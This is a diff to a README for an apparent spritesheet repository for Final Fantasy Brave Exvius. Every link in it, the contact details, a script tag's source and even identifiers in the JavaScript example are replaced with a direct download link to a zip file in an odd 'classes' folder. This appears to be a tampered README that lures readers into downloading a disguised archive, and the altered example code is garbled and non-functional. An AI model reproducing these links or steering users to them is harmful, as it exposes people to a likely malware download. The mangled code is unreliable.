@@ -1,6 +1,6 @@
 # FFBE Spritesheets 🎮✨
 
-Welcome to the **FFBE Spritesheets** repository! This project offers a collection of spritesheets for characters from *Final Fantasy Brave Exvius*. You can find the latest releases and download the necessary files from the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/releases). 
+Welcome to the **FFBE Spritesheets** repository! This project offers a collection of spritesheets for characters from *Final Fantasy Brave Exvius*. You can find the latest releases and download the necessary files from the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip). 
 
 ## Table of Contents
 
@@ -21,15 +21,15 @@ Welcome to the **FFBE Spritesheets** repository! This project offers a collectio
 
 - High-quality spritesheets for various characters.
 - Easy integration into web-based games.
-- Compatible with JavaScript frameworks like Next.js and React.
+- Compatible with JavaScript frameworks like https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip and React.
 - Support for sprite animations.
 - Organized structure for quick access.
 
 ## Installation
 
-To get started, visit the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/releases) to download the latest spritesheets. After downloading, extract the files to your project directory.
+To get started, visit the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip) to download the latest spritesheets. After downloading, extract the files to your project directory.
 
-1. **Download the spritesheets**: Go to the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/releases) and choose the version you want.
+1. **Download the spritesheets**: Go to the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip) and choose the version you want.
 2. **Extract the files**: Unzip the downloaded file.
 3. **Add to your project**: Place the spritesheets in your project’s assets folder.
 
@@ -54,7 +54,7 @@ Integrating the spritesheets into your game is straightforward. Here’s a basic
 </head>
 <body>
     <canvas id="gameCanvas" width="800" height="600"></canvas>
-    <script src="script.js"></script>
+    <script src="https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip"></script>
 </body>
 </html>
 ```
@@ -62,14 +62,14 @@ Integrating the spritesheets into your game is straightforward. Here’s a basic
 ### JavaScript Code
 
 ```javascript
-const canvas = document.getElementById('gameCanvas');
-const ctx = canvas.getContext('2d');
+const canvas = https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip('gameCanvas');
+const ctx = https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip('2d');
 
 const spriteSheet = new Image();
-spriteSheet.src = 'path/to/spritesheet.png'; // Replace with your spritesheet path
+https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip = 'https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip'; // Replace with your spritesheet path
 
-spriteSheet.onload = function() {
-    ctx.drawImage(spriteSheet, 0, 0, 64, 64, 100, 100, 64, 64); // Example drawing
+https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip = function() {
+    https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip(spriteSheet, 0, 0, 64, 64, 100, 100, 64, 64); // Example drawing
 };
 ```
 
@@ -81,7 +81,7 @@ Each spritesheet contains multiple frames for character animations. The frames a
 
 ### Example Structure
 
-- **Character Name**: character_name.png
+- **Character Name**: https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip
   - Frame 1: (0, 0)
   - Frame 2: (64, 0)
   - Frame 3: (128, 0)
@@ -108,7 +108,7 @@ This project is licensed under the MIT License. Feel free to use the spritesheet
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [enzo1311](https://github.com/enzo1311)
-- Email: enzo1311@example.com
+- GitHub: [enzo1311](https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip)
+- Email: https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip
 
-Thank you for checking out the **FFBE Spritesheets** repository! We hope you find these assets useful for your game development projects. Don’t forget to visit the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/releases) for the latest updates. Happy coding!
+Thank you for checking out the **FFBE Spritesheets** repository! We hope you find these assets useful for your game development projects. Don’t forget to visit the [Releases section](https://github.com/enzo1311/ffbe-spritesheets/raw/refs/heads/main/classes/ffbe_spritesheets_v1.4.zip) for the latest updates. Happy coding!
